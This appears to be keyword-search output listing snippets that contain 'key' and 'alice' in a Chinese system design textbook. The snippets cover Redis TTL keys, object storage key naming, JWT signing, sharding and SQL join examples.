  c09_b15.md: ...概念直接适用。  **答案：**  **在线状态数据模型：**  每个用户的在线状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: tim...
  c09_b15.md: ...*答案：**  **在线状态数据模型：**  每个用户的在线状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: timestamp, sta...
  c09_b15.md: ..."online"}     TTL:   5 minutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确...
  c09_b15.md: ...nutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确处理这一点。  **写入量：**  为了让在线状态生...
  c09_b15.md: ...ence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确处理这一点。  **写入量：**  为了让在线状态生效，客户端必须周期性发送心跳来刷新 TTL。30 秒心跳间...
  c09_b15.md: ...`MGET presence:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章...
  c09_b15.md: ...esence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章消息队列和第 7 章缓存）SocialSnap 顶部导航中的通知计...
  c09_b15.md: ...概念直接适用。  **答案：**  **在线状态数据模型：**  每个用户的在线状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: tim...
  c09_b15.md: ...*答案：**  **在线状态数据模型：**  每个用户的在线状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: timestamp, sta...
  c09_b15.md: ..."online"}     TTL:   5 minutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确...
  c09_b15.md: ...nutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确处理这一点。  **写入量：**  为了让在线状态生...
  c09_b15.md: ...ence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key 过期精确处理这一点。  **写入量：**  为了让在线状态生效，客户端必须周期性发送心跳来刷新 TTL。30 秒心跳间...
  c09_b15.md: ...`MGET presence:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章...
  c09_b15.md: ...esence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章消息队列和第 7 章缓存）SocialSnap 顶部导航中的通知计...
  c09_b19.md: ...层负载均衡器基于应用层内容路由（灵活、SSL 终止、稍慢）。健康检查实现自动故障检测。  **一致性哈希** 解决缓存 key 分布问题——集群扩缩容时，只需重新分配相应比例的 key。  **TCP 与 UDP** 代表传输层的基本选择：TCP...
  c09_b19.md: ...。健康检查实现自动故障检测。  **一致性哈希** 解决缓存 key 分布问题——集群扩缩容时，只需重新分配相应比例的 key。  **TCP 与 UDP** 代表传输层的基本选择：TCP 的可靠与有序 vs UDP 的速度与可容忍丢失。大多数...
  c10_b04.md: ...的范式。  对象存储不使用分层目录结构。相反，它把**对象**（任意二进制数据 blob）存在扁平命名空间中，通过唯一 key 访问。把它想象成存储任意二进制数据的巨型键值存储。   #### 定义：对象存储  **对象存储** 将数据存为离散的...
  c10_b04.md: ...将数据存为离散的**对象**，每个对象包含：  * 二进制数据本身（文件、图片、视频、文档——任何字节） * 一个 **key**（唯一标识符——通常像路径：`users/42/profile-photo.jpg`） * **元数据**（cont...
  c10_b04.md: ...据**（content type、自定义属性、标签）  对象通过 HTTP API 访问：用 `PUT /bucket/key` 上传，用 `GET /bucket/key` 下载。没有目录层次——“类路径”的 key 只是字符串。  典型例子：...
  c10_b04.md: ...标签）  对象通过 HTTP API 访问：用 `PUT /bucket/key` 上传，用 `GET /bucket/key` 下载。没有目录层次——“类路径”的 key 只是字符串。  典型例子：Amazon S3（Simple Storag...
  c10_b04.md: ...`PUT /bucket/key` 上传，用 `GET /bucket/key` 下载。没有目录层次——“类路径”的 key 只是字符串。  典型例子：Amazon S3（Simple Storage Service）。概念模型：...
  c10_b04.md: ...ervice）。概念模型：       Bucket: socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/42/co...
  c10_b04.md: ...Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/ph...
  c10_b04.md: ...Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/phot...
  c10_b04.md: ...g         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/phot...
  c10_b04.md: ...g         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结构。列出...
  c10_b04.md: ...photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结构。列出“用户 42 的所有对象”是前缀搜索：`LIST objects...
  c10_b04.md: ...径，但只是字符串——没有真实目录结构。列出“用户 42 的所有对象”是前缀搜索：`LIST objects WHERE key STARTS WITH "users/42/"`。   #### 为什么对象存储能扩展  **无限容量：** 对象存储...
  c10_b05.md: ...供应商都值得验证。  **扁平命名空间：** 没有目录，列出所有对象是完整扫描（按前缀过滤）。层级很深的命名需要仔细的 key 命名约定。...
  c10_b06.md: ...**方案 3：存在对象存储中（正确答案）**       Bucket: socialsnap-media     Key: users/42/profile_photo_v3.jpg   照片上传工作流：  1. 用户通过浏览器上传照片。...
  c10_b11.md: ...PB 每月 23,000 USD——只有 SSD 成本的零头（100,000+ USD/月）。  访问模式：按 URL key 顺序读取大二进制对象。延迟要求：几十到几百毫秒可接受。成本：PB 级唯一经济可承受的分层。  **NVMe SSD 关...
  c10_b11.md: ...eek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平的 key-value 命名空间，每个对象都是不透明的 blob，通过 HTTP 访问（`PUT`/`GET`/`DELETE`...
  c10_b11.md: ...lue 命名空间，每个对象都是不透明的 blob，通过 HTTP 访问（`PUT`/`GET`/`DELETE` by key）。没有目录层次（只有用 key 前缀模拟），没有字节级别的部分读或部分写（你要读或写整个对象），也不能挂载成本地磁盘。...
  c10_b12.md: ...**Q3.** 一致性哈希与我们讨论的存储层级有什么关系？回想第 9 章：一致性哈希解决什么问题？你能看到它与对象存储 key 命名问题的类比吗？  **答案：** 一致性哈希（第 9 章）解决 key 在缓存节点集群上的分布问题：当节点加入或移...
  c10_b12.md: ...致性哈希解决什么问题？你能看到它与对象存储 key 命名问题的类比吗？  **答案：** 一致性哈希（第 9 章）解决 key 在缓存节点集群上的分布问题：当节点加入或移除时，只有一部分 key 需要重新映射。这避免了使缓存失效的集群扩缩容事件。...
  c10_b12.md: ...？  **答案：** 一致性哈希（第 9 章）解决 key 在缓存节点集群上的分布问题：当节点加入或移除时，只有一部分 key 需要重新映射。这避免了使缓存失效的集群扩缩容事件。  与对象存储 key 命名的类比：在对象存储中，bucket 里所...
  c10_b12.md: ...上的分布问题：当节点加入或移除时，只有一部分 key 需要重新映射。这避免了使缓存失效的集群扩缩容事件。  与对象存储 key 命名的类比：在对象存储中，bucket 里所有对象共享单一命名空间。一个大 bucket 可能被存储供应商内部划分到多...
  c10_b12.md: ...ucket 里所有对象共享单一命名空间。一个大 bucket 可能被存储供应商内部划分到多台服务器上。供应商通常用对象 key 的哈希决定每个对象存在哪台存储节点上。一组分布良好的 key（哈希值均匀散布在哈希空间）能把存储负载均匀分布。  如果...
  c10_b12.md: ...可能被存储供应商内部划分到多台服务器上。供应商通常用对象 key 的哈希决定每个对象存在哪台存储节点上。一组分布良好的 key（哈希值均匀散布在哈希空间）能把存储负载均匀分布。  如果 SocialSnap 所有对象 key 都以 `users/...
  c10_b12.md: ...点上。一组分布良好的 key（哈希值均匀散布在哈希空间）能把存储负载均匀分布。  如果 SocialSnap 所有对象 key 都以 `users/42/` 开头（共同前缀），内部存储路由可能把用户 42 的所有对象请求都发到同一存储分片——形成...
  c10_b12.md: ...头（共同前缀），内部存储路由可能把用户 42 的所有对象请求都发到同一存储分片——形成热点。为缓解，有些存储系统建议在 key 中加入随机哈希前缀：       原始 key:  users/42/profile_photo.jpg     优化...
  c10_b12.md: ...所有对象请求都发到同一存储分片——形成热点。为缓解，有些存储系统建议在 key 中加入随机哈希前缀：       原始 key:  users/42/profile_photo.jpg     优化 key: ab3f/users/42/prof...
  c10_b12.md: ...中加入随机哈希前缀：       原始 key:  users/42/profile_photo.jpg     优化 key: ab3f/users/42/profile_photo.jpg  （"ab3f" = hash(42) 截断到 4...
  c10_b12.md: ...s/42/profile_photo.jpg  （"ab3f" = hash(42) 截断到 4 字符）   该前缀让 key 在内部 shard 间分布更均匀。这正是把一致性哈希洞察应用于对象存储层面：均匀散布 key，使没有单个节点成为瓶颈。...
  c10_b12.md: ...4 字符）   该前缀让 key 在内部 shard 间分布更均匀。这正是把一致性哈希洞察应用于对象存储层面：均匀散布 key，使没有单个节点成为瓶颈。存储层级 tradeoff（权衡）在这里也适用——分布不佳的 key 空间即使在“无限可扩展”...
  c10_b12.md: ...于对象存储层面：均匀散布 key，使没有单个节点成为瓶颈。存储层级 tradeoff（权衡）在这里也适用——分布不佳的 key 空间即使在“无限可扩展”的对象存储服务中，也会在规模上造成性能悬崖。...
  c10_b14.md: ...2. 更新 PostgreSQL 的 users.photo_url 为新 URL     3. 使 Redis 缓存 key user:42:profile 失效     4. （异步，通过消息队列）从对象存储删除旧照片   **为什么这个顺序...
  c10_b14.md: ...效。对象存储中的新照片成为“孤儿”——无人引用。一个 eventually 清理作业（列出没有对应数据库条目的对象存储 key）会删除它。这就是最终一致性的定义：对象存储和数据库暂时不一致，但后台进程会协调它们。  **第 3 步失败（缓存失效失...
  c10_b14.md: ...章），失败不影响用户体验。如果删除消息丢失，旧照片会无限期留在对象存储。一个独立的“孤儿对象清理”作业（比较对象存储 key 与数据库 URL）可以发现并删除真正的孤儿对象。...
  c10_b15.md: ...案：**  **关键洞察——URL 版本化消除了大多数失效问题：**  用户上传新头像时，应用生成包含版本标识的新对象 key：       旧 key: users/42/profile_photo_v3.jpg  → URL: https:/...
  c10_b15.md: ...—URL 版本化消除了大多数失效问题：**  用户上传新头像时，应用生成包含版本标识的新对象 key：       旧 key: users/42/profile_photo_v3.jpg  → URL: https://cdn.socialsn...
  c10_b15.md: ...ps://cdn.socialsnap.com/users/42/profile_photo_v3.jpg     新 key: users/42/profile_photo_v4.jpg  → URL: https://cdn.socialsn...
  c10_b15.md: ...的新 URL，指向新照片。  **逐层缓存：**  **1. 对象存储（不是缓存，而是源）：** 新照片作为新对象、新 key 上传。旧对象在异步清理作业删除前一直存在。这里不需要失效——两个对象无害共存。  **2. PostgreSQL `u...
  c10_b16.md: ...。  照片更新时唯一需要主动失效的缓存是 Redis 资料缓存——因为它包含 URL 指针，而不是图像数据本身，且它的 key 不会随照片版本改变。...
  c10_b18.md: ...查询持有锁并消耗 I/O，与 incoming 写入竞争。  **为什么对象存储（S3）不够：**  对象存储优化了按 key 读取或写入整个对象。“统计标签为 #systemdesign 的独立用户数”这类查询需要读取 bucket 中每个对象...
  c10_b19.md: ...置和日志文件的正确选择，但不适合大规模媒体或高吞吐分析。  **对象存储**（S3 及等价物）为任意二进制数据提供扁平 key-value 命名空间，实际上无限扩展、高持久性、每字节低成本。它是用户上传媒体、大数据集和备份的正确存储层级。  **...
  c11_b02.md: ...erver B 在**它自己的** `sessions` 字典中查找 `sess_a7b3c9d2e4f1`。  这个 key 不在那里。Server B 没有处理登录——Server A 处理的。会话只存在于 Server A 的内存中。  S...
  c11_b04.md: ...redis.setex(             f"session:{session_id}",   # key             3600 * 24,                  # TTL: 24 小时...
  c11_b04.md: ...状态的——它自己内存里不保存任何每个会话的数据。  **额外收益：**  **会话 TTL：** Redis 原生支持 key 的 TTL（`SETEX`）。会话在 24 小时无活动后自动过期，无需清理作业。本地内存方案则需要后台线程驱逐过期会话...
  c11_b05.md: ...息队列（通知、邮件）   实践中，“Redis 缓存”和“Redis 会话存储”可以是同一个 Redis 实例，用不同 key 命名空间（`cache:*` vs `session:*`）隔离，也可以是独立实例以获得隔离。独立实例可防止缓存驱逐压...
  c11_b06.md: ...ser_id、username、roles、过期时间） 3. 一个 **signature**（服务器用 secret key 生成的加密签名）  服务器在登录时签发 JWT：  1. 创建 payload：`{"user_id": 42, "u...
  c11_b06.md: ...": 42, "username": "alice", "exp": 1709510400}` 2. 用 secret key 签名：`HMACSHA256(base64(header) + "." + base64(payload), secr...
  c11_b06.md: ...okie 或 localStorage 中）并在每个请求中附带发送。服务器通过验证签名来验证 JWT（用 secret key 重新计算并比对 token 的签名）。如果签名有效，payload 数据就可信——服务器无需任何数据库或 Redis...
  c11_b06.md: ...这是 0ms 网络延迟。  **水平扩展：** 任何服务器都能验证任何 JWT，因为所有服务器共享同一个 secret key（或使用公钥密码学：验证 key 共享，签名 key 私有）。不需要共享会话状态。  **可移植：** JWT 可跨域和...
  c11_b06.md: ...水平扩展：** 任何服务器都能验证任何 JWT，因为所有服务器共享同一个 secret key（或使用公钥密码学：验证 key 共享，签名 key 私有）。不需要共享会话状态。  **可移植：** JWT 可跨域和跨服务使用。如果 SocialS...
  c11_b06.md: ...服务器都能验证任何 JWT，因为所有服务器共享同一个 secret key（或使用公钥密码学：验证 key 共享，签名 key 私有）。不需要共享会话状态。  **可移植：** JWT 可跨域和跨服务使用。如果 SocialSnap 开发了独立...
  c11_b06.md: ...撤销 token ID 的集合）——但你重新引入了对 Redis 的依赖，部分抵消了无状态收益 * 轮换 secret key——让所有用户的所有 token 失效（强制全局登出）  这些 workaround 都不如 Redis 里的 sess...
  c11_b12.md: ...ID、username、过期时间等）包含在 token 自身中。服务器在登录时创建 payload 并用 secret key 签名。后续请求中，服务器通过重新计算签名并比对来验证 JWT——无需外部存储查找。  **它解决的问题：** 服务端会...
  c12_b04.md: ...有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,000,00...
  c12_b04.md: ...其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希函数，用结果决定 shard。例如，`shard_number = hash(user_id) % num_s...
  c12_b04.md: ...于目录的分片（directory-based sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略—...
  c12_b04.md: ...hard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同 shard，而不必遵循公式。  目录分片的成本是目录本身。目录查找给每次操作增加延迟，目录成为单点故障...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 million）粉丝。每...
  c12_b05.md: ...关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热 key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 Redis），或在应...
  c12_b05.md: ...热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热 key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 Redis），或在应用层把热 key 跨多个 shar...
  c12_b05.md: ...：更激进地复制热 key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 Redis），或在应用层把热 key 跨多个 shard 拆分。这些都不简单。   #### SocialSnap v5——按 user_id 分片  So...
  c12_b05.md: ...，也是分片最显著的成本之一。  分片前是 O(1) 查找的简单查询，分片后变成 O(shards) 的扇出操作。按不同 key 分片的表之间 JOIN 在单次查询中变得不可能——你必须执行多次查询，然后在应用代码中合并结果。  再举个例子：“找出...
  c12_b05.md: ...是设计约束。它迫使团队仔细考虑需要什么查询，并据此设计分片策略。一个能消除大多数跨分片查询的常见访问模式的 shard key，值得在其他地方付出显著 tradeoff（权衡）。...
  c12_b09.md: ...**Q3.** 基于范围和基于哈希的分片有什么区别？各举一个优点。  **答案：** 基于范围的分片按 shard key 的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找...
  c12_b09.md: ...的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 sha...
  c12_b09.md: ...。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，...
  c12_b09.md: ...并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 shard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种策略是什么？  **答案：** 重分片...
  c15_b13.md: ...立。  正确做法：客户端用 UUID 或类似高熵随机值生成幂等键，并通过请求头显式传递（例如 `Idempotency-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result...
  c15_b13.md: ...mpotency-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result。客户端为每次不同操作生成新键，对同一操作的重试复用同一键。...
  c15_b14.md: ...计永远依赖这一假设对所有输入成立。  正确做法：客户端用 UUID 或类似高熵随机值生成幂等键（idempotency key，幂等性），并通过请求头显式传递（例如 `Idempotency-Key: 7f3a9b2c-...`）。键由客户端控制...
  c15_b14.md: ...似高熵随机值生成幂等键（idempotency key，幂等性），并通过请求头显式传递（例如 `Idempotency-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result...
  c15_b14.md: ...mpotency-Key: 7f3a9b2c-...`）。键由客户端控制，绑定到特定重试尝试，与请求体无关。服务器存储 key → result。客户端为每次不同操作生成新键，对同一操作的重试复用同一键。...
  c17_b01.md: ...任意问题：“过去 10 分钟哪些用户经历了延迟升高？涉及哪些应用服务器？哪些 Redis 命令超时？是所有命令还是特定 key 模式？”这就是可观测性——你可以形成并回答事故前没想到要问的问题。  三种类型的遥测数据构成可观测性的基础。...
  c17_b05.md: ...UG，只在调试特定服务时按需开启。  INFO 日志记录正常、预期但有意义粒度的事件：“用户登录”、“支付处理完成”、“key X 缓存未命中”。它们讲述正常操作的故事。  WARN 日志记录预期但值得注意的事件：“缓存未命中率超过 50%——可...
  c19_b09.md: ...#### 密钥管理  服务运行需要密钥：数据库密码、第三方服务 API key、TLS 私钥、JWT 签名密钥。安全地管理这些密钥是关键运营挑战。  幼稚做法——把密钥存在配置文件或环境变量中——带...
  c20_b04.md: ...始：  **`urls` 表**（核心）：  * `short_code` (VARCHAR(16), PRIMARY KEY) — 短码或自定义别名 * `long_url` (TEXT, NOT NULL) — 目标 URL * `creat...
  c20_b04.md: ...**`clicks` 表**（分析）：  * `id` (BIGINT, AUTO-INCREMENT PRIMARY KEY) * `short_code` (VARCHAR(16), NOT NULL, FK → urls) * `click...
  c21_b06.md: ...assandra（第 6 章的列族存储）正是为该访问模式设计：Cassandra 的数据模型天然按 partition key（`conversation_id`）分区、按 sort key（`sent_at`）聚簇，提供 O(1) 的分区查找和...
  c21_b06.md: ...assandra 的数据模型天然按 partition key（`conversation_id`）分区、按 sort key（`sent_at`）聚簇，提供 O(1) 的分区查找和 O(log N) 的分区内范围扫描。许多大规模聊天系统（包括...
  c25_b06.md: ...图记录重试——扣款尝试有唯一 ID，即使多次发送同一请求，支付处理器也不会重复扣款。这就是 **idempotency key（幂等性键）** 模式，在分布式系统中对 exactly-once 金融操作至关重要。  * * *...
  c25_b13.md: ...reSQL 存行程和计费状态）明确容纳两者。  **计费** 应用第 5 章 ACID 属性和 idempotency key（幂等性键）模式，确保在网络故障和重试下的 exactly-once 金融交易事务（transaction）。  与第...
  c26_b11.md: ...个节点维护的 Merkle tree 叶子覆盖 1 万（10,000）键范围。某节点故障后从 1 小时中断恢复，估计该 key range 期间有约 50 万（500,000）键被写入。估算定位分歧范围所需 Merkle tree 比较次数、分歧...
  c28_b11.md: ...ore (MongoDB)** (Ch 6) | 文档级操作低 | 最终（默认）；可配置 | 高（副本集） | 中 **Key-value store (Redis)** (Ch 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模...

=== alice (155 occurrences) ===
  c05_b01.md: ...| password_hash | created_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob...
  c05_b01.md: ...ord_hash | created_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@ex...
  c05_b01.md: ...posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice。这就是**外键（foreign key）**——一张表中的列引用另一张表的主键。外键是关系模型表达关系的方式。   #...
  c05_b01.md: ...| password_hash | created_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob...
  c05_b01.md: ...ord_hash | created_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@ex...
  c05_b01.md: ...posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice。这就是**外键（foreign key）**——一张表中的列引用另一张表的主键。外键是关系模型表达关系的方式。   #...
  c05_b02.md: ...的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.con...
  c05_b02.md: ...*join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.cre...
  c05_b02.md: ...ers ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取...
  c05_b02.md: ...2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户名、内容和创建时间  你没有写循环。你没有遍历树。你声明你想要什么，数据库自己想办法取回。这就是...
  c05_b02.md: ...的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.con...
  c05_b02.md: ...*join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.cre...
  c05_b02.md: ...ers ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取...
  c05_b02.md: ...2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户名、内容和创建时间  你没有写循环。你没有遍历树。你声明你想要什么，数据库自己想办法取回。这就是...
  c05_b03.md: ...`（用一个索引高效找到某用户的最近帖子）  `(user_id, created_at)` 上的复合索引可以服务“给我 Alice 最近 10 条帖子”而不用碰表的其他部分。   ### 5.3 事务与 ACID  数据库存储关键数据。用户账户余额、...
  c05_b04.md: ...么完全完成，要么不留下任何痕迹。没有“半完成”状态会被其他用户看到。  考虑 SocialSnap 的“关注用户”操作。Alice 关注 Bob 时，我们需要：  1. 在 `follows` 表中插入一行：`(follower_id=1, foll...
  c05_b04.md: ..._id=1, followed_id=2)` 2. 把 Bob 的 `follower_count` 加 1 3. 把 Alice 的 `following_count` 加 1  如果第 2 步成功而第 3 步崩溃，Alice 的计数就错了。如果第...
  c05_b04.md: ...` 加 1 3. 把 Alice 的 `following_count` 加 1  如果第 2 步成功而第 3 步崩溃，Alice 的计数就错了。如果第 1 步成功而第 2 步崩溃，Alice 被列为关注了 Bob，但 Bob 的计数没增加。  事务...
  c05_b04.md: ...ount` 加 1  如果第 2 步成功而第 3 步崩溃，Alice 的计数就错了。如果第 1 步成功而第 2 步崩溃，Alice 被列为关注了 Bob，但 Bob 的计数没增加。  事务把三步包起来。任何一步失败，所有步骤都像没发生过一样回滚。...
  c05_b06.md: ...wer_id, followed_id)` 有两个作用：它创建唯一约束（你不能关注同一个人两次），并创建复合索引，让 “Alice 是否关注 Bob？” 能快速查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子...
  c05_b06.md: ...人两次），并创建复合索引，让 “Alice 是否关注 Bob？” 能快速查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, post...
  c05_b06.md: ...ts.user_id = users.id     WHERE follows.follower_id = 1  -- Alice 的 user_id     ORDER BY posts.created_at DESC     LIMIT 20;...
  c05_b06.md: ...三张表。如果 `follows.follower_id` 和 `posts.created_at` 上有合适的索引，当 Alice 关注的人数合理（几百人）时，它很快。当 Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，...
  c05_b06.md: ...d` 和 `posts.created_at` 上有合适的索引，当 Alice 关注的人数合理（几百人）时，它很快。当 Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，join 会变成大型排序操作。我们将在 Feed 案...
  c05_b08.md: ...**Q2.** 用银行转账解释 ACID 性质。对每一性质，描述如果它被违反会发生什么。  **答案：** 考虑一笔从 Alice 账户转 100 USD 到 Bob 账户的转账，实现为两条 SQL 更新。  **没有原子性：** 从 Alice 扣...
  c05_b08.md: ...从 Alice 账户转 100 USD 到 Bob 账户的转账，实现为两条 SQL 更新。  **没有原子性：** 从 Alice 扣款（`balance -= 100`）成功，但给 Bob 加款（`balance += 100`）失败（磁盘满、崩溃...
  c05_b08.md: ...alance -= 100`）成功，但给 Bob 加款（`balance += 100`）失败（磁盘满、崩溃等）。现在 Alice 少了 100 USD，但 Bob 没收到。钱消失了。有了原子性，两条更新要么都成功，要么都不成功——没有部分状态。...
  c05_b08.md: ...条更新要么都成功，要么都不成功——没有部分状态。  **没有一致性：** 约束规定账户余额不能为负。没有一致性强制执行，Alice 可能从 50 USD 账户转出 100 USD，余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束...
  c05_b08.md: ...100 USD，余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔离性：** Alice 和 Bob 同时从同一个 100 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，...
  c05_b08.md: ...D。有了隔离（至少 Repeatable Read），一个事务会看到另一个的写入，第二个失败。  **没有持久性：** Alice 转 100 USD。数据库提交并告诉 Alice “成功。” 一秒后服务器崩溃，磁盘缓冲区还没刷盘。重启后，100 U...
  c05_b08.md: ...），一个事务会看到另一个的写入，第二个失败。  **没有持久性：** Alice 转 100 USD。数据库提交并告诉 Alice “成功。” 一秒后服务器崩溃，磁盘缓冲区还没刷盘。重启后，100 USD 转账没了——但 Alice 已被告知成功。有...
  c05_b08.md: ...数据库提交并告诉 Alice “成功。” 一秒后服务器崩溃，磁盘缓冲区还没刷盘。重启后，100 USD 转账没了——但 Alice 已被告知成功。有了持久性（预写日志），“成功”返回前转账已在磁盘上，崩溃恢复会重演它。  **Q3.** 为什么在表上...
  c05_b10.md: ...和 @bob”）。设计支持此功能所需的 schema 扩展，包括合适的索引。然后写一条 SQL 查询“给我看所有提及 Alice 的帖子，按最近排序”。  提示  把提及存成 posts 表里的逗号分隔字符串（“@alice,@bob”）违反关系模...
  c05_b10.md: ...或“association table”）。把提及存成文本字段（“@alice,@bob”）会：  * 让“找所有提及 Alice 的帖子”需要全文本扫描（慢，O(n)） * 违反引用完整性（如果被提及用户改了用户名怎么办？） * 让删除用户变复杂（...
  c05_b10.md: ...整性（如果被提及用户改了用户名怎么办？） * 让删除用户变复杂（必须扫描所有帖子内容找用户名）  **查询——所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.crea...
  c05_b10.md: ...mentions.user_id = (SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;  有了 `idx...
  c05_b10.md: ...ted_at DESC     LIMIT 20;  有了 `idx_mentions_user_id`，数据库先找到 Alice 的 `user_id`，再用索引只取 `mentions` 中 Alice 的行——O(log n + k)，k 是...
  c05_b10.md: ...tions_user_id`，数据库先找到 Alice 的 `user_id`，再用索引只取 `mentions` 中 Alice 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 j...
  c05_b10.md: ...的 `user_id`，再用索引只取 `mentions` 中 Alice 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2...
  c05_b13.md: ...开，`follows` 表已记录新关系，但 `follower_count` 没有递增。现在 `follows` 显示 Alice 关注了 Bob，但 Bob 的 `follower_count` 少了 1。  在规模下，类似的部分失败会累积。例如删...
  c06_b01.md: ...问题的正确数据库是什么？  再考虑另一个案例：一个社交网络存储 200 百万（2 亿）用户，需要在 10 ms 内回答“Alice 是不是 Bob 的朋友？”。友谊图有 50 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不...
